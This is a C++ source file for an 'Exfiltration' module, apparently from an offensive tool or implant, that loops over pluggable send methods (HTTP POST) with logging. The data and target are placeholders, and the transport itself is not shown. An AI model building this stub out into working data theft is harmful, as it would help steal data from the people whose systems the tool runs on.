#include "modules/Exfiltration.hpp"
#include "utils/Logger.hpp"
#include "modules/exfiltration/HttpPost.hpp"

Exfiltration::Exfiltration() {
    methods.push_back(std::make_unique<HttpPostMethod>());
}

bool Exfiltration::execute(const std::string& args) {
    LOG_INFO("Begin exfiltration")

    if (methods.empty()) {
        LOG_ERROR("No exfiltration methods available")
        return false;
    }

    // dummy for now, think about what should be here instead
    std::string targetFile = args.empty() ? ".test" : args;
    std::string data = "some secret data";

    int successCount = 0;
    for (auto& method : methods) {
        if (method->canHandle(data.size())) {
            LOG_INFO("Exfiltrating data via {}", method->getName())

            if (method->send(targetFile, data)) {
                LOG_SUCCESS("Successfully exfiltrated data via {}", method->getName())
                successCount++;
            } else {
                LOG_ERROR("Failed exfil via {}", method->getName())
            }
        }
    }

    return successCount;
}